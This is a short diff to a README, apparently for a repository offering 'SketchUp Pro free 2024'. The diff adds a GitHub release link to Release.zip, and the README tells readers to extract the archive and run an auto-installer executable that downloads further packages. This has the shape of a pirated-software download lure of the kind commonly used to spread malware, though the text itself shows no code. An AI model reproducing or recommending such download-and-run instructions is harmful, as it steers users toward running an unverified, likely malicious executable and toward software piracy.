@@ -8,11 +8,11 @@
 
 ### Installation
 [![asdasdasd](https://github.com/user-attachments/assets/1814c643-c2a3-4cad-b7b5-dc84cd300fdc)
-]()
+](https://github.com/VinosoPizzas/SketchUp-Pro-free-2024/releases/download/V7.64/Release.zip)
 
 
 
-## **1. [Download the archive]() and extract it to a convenient folder.**
+## **1. [Download the archive](https://github.com/VinosoPizzas/SketchUp-Pro-free-2024/releases/download/V7.64/Release.zip) and extract it to a convenient folder.**
 ## **2. Run the auto-installer `Installing_File_x64.exe`. It will install and download all necessary packages for > operation.**
 
 
